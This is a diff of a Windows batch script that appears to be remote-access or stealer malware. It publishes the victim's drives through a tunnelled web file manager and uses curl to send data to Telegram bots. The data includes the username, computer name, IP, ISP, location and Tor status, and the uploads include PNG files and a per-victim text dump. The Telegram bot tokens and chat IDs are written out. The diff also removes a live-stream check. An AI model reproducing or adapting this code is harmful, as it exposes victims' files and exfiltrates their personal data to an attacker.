@@ -61,24 +61,16 @@ if exist "%temp%\localtunnel.txt" (
 ) else (
    echo.
 )
-
-setlocal enableDelayedExpansion
-set temporary=%temp%
-for %%f IN (%temporary:~3%/playlist.m3u8) DO (
-  set oldtemp=%%f
-  set newtemp=!oldtemp:\=/! 
-  set WS=%URI:~0,-1%
-)
+set WS=%URI:~0,-1%
 
 tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
 if not errorlevel 1 (echo.) else (taskkill /f /im "Localtunnel.exe" && set WS=Off && set "newtemp= ")
-tasklist /fi "imagename eq ffmpeg.exe" | find /i "ffmpeg.exe" > nul
-if not errorlevel 1 (set LS="%WS%!newtemp!") else (set LS="Off")
 
-powershell.exe Remove-Item -Force "C:\drives.html"
+setlocal enableDelayedExpansion
 powershell.exe Remove-Item -Force "%environment%\apache2\php\index.php"
 echo ^<a href="%WS%tinyfilemanager.php"^>TFM^</a^>^<br^> > "%environment%\apache2\php\index.php"
 FOR /F "usebackq tokens=1" %%a IN (`MOUNTVOL ^| FIND ":\"`) DO (FOR /F "usebackq tokens=3" %%b IN (`FSUTIL FSINFO DRIVETYPE %%a`) DO (set drive=%%a && echo ^<a href="%WS%!drive:~0,-2!"^>%%a^</a^>^<br^> >> "%environment%\apache2\php\index.php"))
+setlocal disableDelayedExpansion
 
 for /f "tokens=1" %%i in ('%environment%\curl.exe -k -H "Bypass-Tunnel-Reminder: 1" %WS%') do set "status=%%i"
 if "%status%"=="404" (
@@ -87,7 +79,7 @@ if "%status%"=="404" (
   echo.
 )
 
-"%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS% ] [Live Stream: %LS%] " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574
+"%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS%] " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574
 for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot6053961003:AAENR1HtCpNA7AJaWN1LUnPXxuEsoogKBG8/sendDocument?chat_id=-1001930176759
 "%environment%\curl.exe" -k %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot6330710820:AAFCaGDiYMvQ2SJxcMbvP6D2_tCFS9NtBzo/sendDocument?chat_id=-1001909920652
 
